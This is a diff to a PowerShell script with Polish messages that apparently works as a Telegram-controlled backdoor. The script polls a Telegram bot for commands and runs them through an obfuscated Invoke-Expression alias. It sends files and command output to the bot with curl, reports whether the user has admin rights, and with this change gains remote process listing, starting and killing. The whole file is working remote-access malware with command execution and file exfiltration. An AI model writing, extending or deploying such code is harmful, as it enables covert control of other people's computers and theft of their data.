@@ -16,7 +16,7 @@ function CheckAdminRights
 {
     $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
     $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if ($elevated) { return ("Użytkownik '$env:USERNAME' ma uprawnienia administratora") } 
+    if ($elevated) { return ("Użytkownik '$env:USERNAME' ma uprawnienia administratora") }
     else { return ("Użytkownik '$env:USERNAME' nie ma uprawnień administratora") }
 }
 
@@ -25,17 +25,17 @@ function DownloadFile($file_id, $file_name)
     $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
     $file_path      = $get_file_path.result.file_path
     Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
-    if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" } 
+    if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" }
     else { SendMessage "Plik nie został pobrany" }
 }
 
-function SendFile($filePath) 
+function SendFile($filePath)
 {
     SendMessage "Przystępuję do wysłania pliku [$($filePath)]"
     if (Test-Path -Path $filePath -PathType Leaf) {
-        try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null } 
+        try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null }
         catch { SendMessage "Błąd podczas przesyłania pliku: [$($Error[0])]" }
-    } 
+    }
     else { SendMessage "Wskazany plik nie został znaleziony" }
 }
 
@@ -84,17 +84,39 @@ function SendMessage($output, $cmd)
 }
 
 function TestTelegramAPI {
-    try { 
+    try {
         Invoke-RestMethod -Uri $api_get_me -TimeoutSec 3 -ErrorAction Stop | Out-Null
-        return $true 
-    } 
+        return $true
+    }
     catch { return $false }
+}
+
+function ManageProcesses($action, $processName)
+{
+    switch ($action) {
+        "list" {
+            $processes = Get-Process | Select-Object -Property Name, ID, CPU, PM
+            $output = $processes | Out-String
+            SendMessage $output
+        }
+        "start" {
+            Start-Process -Name $processName
+            SendMessage "Process $processName started."
+        }
+        "stop" {
+            Stop-Process -Name $processName -Force
+            SendMessage "Process $processName stopped."
+        }
+        default {
+            SendMessage "Unknown action: $action"
+        }
+    }
 }
 
 function CommandListener
 {
     $offset = 0
-    
+
     Add-Type -AssemblyName System.Windows.Forms
     [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position
 
@@ -107,16 +129,16 @@ function CommandListener
                 if ($CurrentStatus) { SendMessage "Computer online" }
                 $PreviousStatus = $CurrentStatus
             }
-            
+
             Start-Sleep -Milliseconds 1000
             $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
             if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
-                if ($offset -eq 0) { 
+                if ($offset -eq 0) {
                     $offset = $message.result.Count
                     Start-Sleep -Seconds 1
-                    continue 
+                    continue
                 }
-                
+
                 $offset     = $message.result.Count
                 $message    = $message.result.Message[-1]
                 $user_id    = $message.chat.id
@@ -140,14 +162,14 @@ function CommandListener
                         $change_location_check = $text -split ' ' | Select-Object -First 1
                         if ($change_location_check -match "cd" -or $change_location_check -match "Set-Location") {$text = $text + "; ls"}
                         $output = .(Get-Alias ?e[?x])($text) | Out-String
-                    } 
+                    }
                     catch { $output = $Error[0] | Out-String }
 
                     $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
                         $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
                     }
 
-                    foreach ($block in $output_splitted) { 
+                    foreach ($block in $output_splitted) {
                         $block = $block | Out-String
                         SendMessage $block $text
                         Start-Sleep -Milliseconds 100
@@ -161,5 +183,4 @@ function CommandListener
     }
     $session.Dispose()
 }
-
 CommandListener
